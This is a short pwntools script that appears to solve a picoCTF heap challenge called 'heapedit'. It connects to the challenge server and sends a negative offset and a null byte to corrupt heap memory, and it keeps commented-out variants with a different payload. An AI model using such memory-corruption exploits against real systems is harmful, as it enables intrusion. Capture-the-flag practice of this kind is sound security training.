from pwn import *

host = 'mercury.picoctf.net' 
port = 31153

p = remote(host, port)
# p = process('./heapedit')

p.sendline(b'-5144')
p.sendline(b'\x00')


print(p.recvall())

# p.interactive()

# payload = b'-5064\n' + b'\xf0\n'

# with open('payload', 'wb') as fp:
# 	fp.write(payload)